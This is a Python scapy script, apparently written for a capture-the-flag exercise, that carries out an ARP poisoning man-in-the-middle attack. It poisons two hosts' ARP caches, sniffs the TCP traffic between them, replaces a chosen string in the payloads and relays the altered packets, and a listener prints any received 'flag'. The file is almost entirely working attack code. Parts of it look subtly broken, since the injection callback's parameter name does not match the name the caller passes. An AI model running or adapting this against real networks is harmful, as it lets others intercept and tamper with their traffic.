import time
import socket
import logging
import argparse
import threading
import subprocess
from scapy.all import srp, sniff, sendp, get_if_hwaddr, Raw, Ether, ARP, IP, TCP

# Hardcoded vars
broadcast = "ff:ff:ff:ff:ff:ff"
arp_table = {}


# TCP listener server, useful for doing ARP poison to redirect TCP conns
def tcp_listener(port=8888):
    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", port))
    server_socket.listen()

    print(f"[+] Listening on TCP port {port}...")

    while True:
        try:
            conn, addr = server_socket.accept()
            print(f"[+] Connection from {addr}")
            flag = conn.recv(1024)
            print(f"\n[!] FLAG: {flag.decode(errors='ignore').strip()}\n")
            conn.close()
        except ConnectionError:
            continue


# Send an ARP query
def arp_scan(ip, iface):
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, unans = srp(request, timeout=2, retry=20, verbose=False)
    for sent, received in ans:
        if received.hwsrc is not None:
            return received.hwsrc
    return None


# Perform an ARP poisoning attack
def arp_poison(target, address, iface="eth0", iterations=100):
    logger = logging.getLogger("script")
    mac = get_if_hwaddr(iface)
    pkt = Ether(src=mac, dst=broadcast) / ARP(
        op="is-at", psrc=address, hwsrc=mac, pdst=target
    )
    logger.info(f"[+] ARP Poisoning: {target} to point {address} to us ({mac})")
    for _ in range(iterations):
        sendp(pkt, iface=iface, verbose=False)
        time.sleep(0.05)


# Callback to inspect packet, inject if needed and relay to destination
def inject(pkt, replace_rule, iface):
    logger = logging.getLogger("script")
    if Raw not in pkt:
        relay_mitm(pkt=pkt, payload=None, iface=iface)
        return

    payload = pkt[Raw].load.decode()
    logger.info(f"{pkt[IP].src}:{pkt[TCP].sport} sent: {payload}")
    for key in replace_dict:
        if key in payload:
            payload = payload.replace(key, replace_dict[key])

    # Relay packet
    relay_mitm(pkt=pkt, payload=payload.encode(), iface=iface)


# Relay a MITM'ed packet to its rightful destination, swapping MACs and payloads
def relay_mitm(pkt, payload, iface):
    # Get logger
    logger = logging.getLogger("script")

    # Extract connection information
    recv_frame = pkt[Ether]
    recv_dgram = pkt[IP]
    recv_pkt = pkt[TCP]

    src_ip = recv_dgram.src
    dst_ip = recv_dgram.dst
    src_mac = get_if_hwaddr(iface)  # MITM attacker MAC
    dst_mac = arp_table[dst_ip]  # Relay target MAC (resolved before ARP poisoning)
    src_port = recv_pkt.sport
    dst_port = recv_pkt.dport

    # Debugging
    logger.debug(
        f"{recv_dgram.src}:{src_port} [{recv_frame.src}] -> {recv_dgram.dst}:{dst_port} [{recv_frame.dst}] (time: {pkt.time})"
    )
    logger.debug(f"SEQ: {recv_pkt.seq}, ACK: {recv_pkt.ack}, FLAGS: {recv_pkt.flags}")

    # Build up Ethernet frame,
    ether_frame = Ether(src=src_mac, dst=dst_mac)

    # Build up IP datagram
    ip_dgram = IP(src=src_ip, dst=dst_ip)

    # Build up TCP packet
    tcp_pkt = TCP(
        sport=src_port,
        dport=dst_port,
        seq=recv_pkt.seq,
        ack=recv_pkt.ack,
        flags=recv_pkt.flags,
    )

    # Build payload (if not None) and relay packet
    if payload is not None:
        raw_data = Raw(load=payload)
        relay_pkt = ether_frame / ip_dgram / tcp_pkt / raw_data
    else:
        relay_pkt = ether_frame / ip_dgram / tcp_pkt

    # Debug
    logger.debug(
        f"[RELAY] {src_ip}:{src_port} [{src_mac}] -> {dst_ip}:{dst_port} [{dst_mac}] (time: {pkt.time})"
    )

    # Force TCP & IP checksum recalculation and send
    del relay_pkt[IP].chksum
    del relay_pkt[TCP].chksum

    sendp(relay_pkt, iface=iface, verbose=False)


# Perform MITM attack and hook the inject function to modify packets
def mitm_flow(target_1, target_2, replace_dict, iface):
    # Get logger
    logger = logging.getLogger("script")

    # Populate global relay table
    while True:
        mac_1 = arp_scan(ip=target_1, iface=iface)
        mac_2 = arp_scan(ip=target_2, iface=iface)
        if mac_1 is not None and mac_2 is not None:
            logger.debug(f"[+] ARP resolved: {target_1} => {mac_1}")
            logger.debug(f"[+] ARP resolved: {target_2} => {mac_2}")
            global arp_table
            arp_table[target_1] = mac_1
            arp_table[target_2] = mac_2
            break

    try:
        # Setup IP to MAC bindings in linux
        subprocess.run(
            ["ip", "addr", "add", f"{target_1}/24", "dev", "eth0"], check=True
        )
        subprocess.run(
            ["ip", "addr", "add", f"{target_2}/24", "dev", "eth0"], check=True
        )

        # Start two background threads to poison the ARP tables of the targets
        args_1 = (target_1, target_2, iface)
        args_2 = (target_2, target_1, iface)

        poison_thread_1 = threading.Thread(target=arp_poison, args=args_1, daemon=True)
        poison_thread_2 = threading.Thread(target=arp_poison, args=args_2, daemon=True)
        poison_thread_1.start()
        poison_thread_2.start()

        # Sniff on iface and inject TCP packets if needed
        sniff(
            lfilter=lambda p: p[Ether].dst == get_if_hwaddr(iface) and TCP in p,
            iface=iface,
            prn=lambda pkt: inject(pkt=pkt, replace_dict=replace_dict, iface=iface),
        )
    finally:
        # Clean IP to MAC bindings
        subprocess.run(
            ["ip", "addr", "del", f"{target_1}/24", "dev", "eth0"], check=True
        )
        subprocess.run(
            ["ip", "addr", "del", f"{target_2}/24", "dev", "eth0"], check=True
        )


if __name__ == "__main__":
    # Get from argparse
    parser = argparse.ArgumentParser(description="MITM script")
    parser.add_argument("--iface", default="eth0", help="Network interface to use")
    parser.add_argument("--target-1", default="10.0.0.1", help="First target IP")
    parser.add_argument("--target-2", default="10.0.0.2", help="Second target IP")
    parser.add_argument(
        "--replace-pattern", default="good", help="String which will be replaced"
    )
    parser.add_argument(
        "--replace-with",
        default="evil",
        help="What to replace the string pattern with",
    )
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    args = parser.parse_args()

    # Configure loggers
    logging.getLogger("scapy").setLevel(logging.CRITICAL)  # Make scapy shut up
    logging.getLogger("script").setLevel(logging.DEBUG if args.debug else logging.INFO)

    # Hardcoded, feel free to replace
    replace_dict = {args.replace_pattern: args.replace_with}

    # Run script
    mitm_flow(
        target_1=args.target_1,
        target_2=args.target_2,
        replace_dict=replace_dict,
        iface=args.iface,
    )
